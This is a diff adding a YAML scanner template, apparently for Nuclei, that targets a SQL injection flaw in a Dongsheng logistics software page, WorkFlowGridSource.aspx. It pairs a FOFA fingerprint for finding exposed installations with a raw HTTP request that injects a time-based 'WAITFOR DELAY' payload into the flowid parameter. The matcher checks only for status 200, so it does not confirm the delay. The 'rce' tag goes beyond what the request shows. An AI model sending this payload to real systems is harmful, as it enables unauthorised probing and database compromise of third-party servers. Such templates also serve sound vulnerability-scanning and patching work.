@@ -1,0 +1,33 @@
+id: poc-ngaf3pdgzgittxl1
+info:
+  name: 东胜物流软件 WorkFlowGridSource.aspx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ngaf3pdgzgittxl1'
+  tags: rce,sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ngaf3pdgzgittxl1
+    fofa: app="东胜物流软件-物流软件"
+http:
+- raw:
+  - 'GET /WorkFlow/WorkFlowGridSource.aspx?handle=steplist&flowid=-1'';WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate
+
+    Upgrade-Insecure-Requests: 1
+
+    Priority: u=0, i
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
